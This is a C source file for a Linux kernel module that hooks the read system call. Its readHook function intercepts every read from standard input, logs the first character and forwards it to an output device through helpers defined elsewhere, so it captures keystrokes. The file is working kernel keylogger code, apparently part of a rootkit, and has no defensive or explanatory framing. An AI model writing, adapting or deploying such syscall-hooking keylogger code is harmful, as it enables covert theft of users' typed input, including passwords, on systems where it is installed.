//TODO: stop including these everywhere..
#include <linux/module.h>   // For modules
#include <linux/kernel.h>   // For KERN_INFO
#include <linux/init.h>     // For init macros
#include <linux/errno.h>
#include <linux/types.h>
#include <linux/unistd.h>
#include <asm/cacheflush.h>
#include <linux/sched.h>
#include <linux/kallsyms.h>

#include "common.h"
#include "logInput.h"
#include "communicationOutput.h"

struct page *syscallPageTemp;

asmlinkage int (*originalRead)(int, void*, size_t) = NULL;


asmlinkage int readHook(int fd, void* buf, size_t nbytes) {
	int result;

	//this will impact perfromance...
	try_module_get(THIS_MODULE); // there is still a race condition e.g.. if something is going to call this function then it is removed..
	
	{
		result = (*originalRead)(fd, buf, nbytes);
		if (fd==0)
		{	
			
		//printInfo("\n");
		   printInfo ("%c\n", (((char *) buf)[0]));
			
			{
				char *bufferAsCharacterAnArray = (char *) buf;
				char ch = bufferAsCharacterAnArray[0];
				addCharacterToOutputDevice(ch);
			}
			//printInfo("stdin read\n");
		//printInfo("bytes read = %d\n", (int) nbytes);
		}
	}
	
	module_put(THIS_MODULE); //  Decrement the usage count. there is a race condition on exit... as well...  
	return result;
} 


int logInput_init(void) {
	if (originalRead == NULL) {
		originalRead = hookSyscall(__NR_read, readHook);
		printInfo("original read is at %p\n", originalRead);
	}
	return 0;
}

void logInput_exit(void) {
	if (originalRead != NULL) {
		printInfo("restoring original read call to %p\n", originalRead);
		hookSyscall(__NR_read, originalRead);
		originalRead = NULL;
	}
}
